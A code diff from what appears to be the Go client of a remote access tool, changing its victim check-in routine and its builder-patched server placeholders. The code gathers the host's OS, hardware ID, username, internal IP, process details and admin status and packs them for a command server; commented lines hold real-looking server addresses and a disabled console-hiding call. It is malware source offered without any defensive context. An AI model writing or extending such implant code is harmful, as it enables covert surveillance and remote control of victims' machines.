@@ -137,25 +137,20 @@ func (s *TCPClient) KeepAlivePacket(conn net.Conn) {
 func SendInfo() []byte {
 	msgpack := new(MessagePack.MsgPack)
 	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
-
 	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetOSVersion())
 	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
-
 	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetUserName())
 	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
 	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
-
 	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
 	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
 	msgpack.ForcePathObject("SleepTime").SetAsString("10")
 	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
 	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
-
 	msgpack.ForcePathObject("Admin").SetAsString(PcInfo.IsAdmin())
 	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
 	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
 	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
-	//println(string(msgpack.Encode2Bytes()))
 	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
 	return msgpack.Encode2Bytes()
 }
@@ -178,16 +173,16 @@ var ClientWorking bool
 
 func main() {
 
-	Host := "HostAAAABBBBCCCCDDDD"
+	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
 	Port := "PortAAAABBBBCCCCDDDD"
 	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
 	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
 	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
 	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 
-	// PcInfo.Host = "8.138.126.72"
-	// PcInfo.Port = "4000"
-	// PcInfo.ListenerName = "asd"
+	// PcInfo.Host = "192.168.244.141"
+	// PcInfo.Port = "8000"
+	// PcInfo.ListenerName = "wd"
 	//HideConsole()
 	PcInfo.IsDotNetFour = checkDotNetFramework40()
 	ClientWorking = true
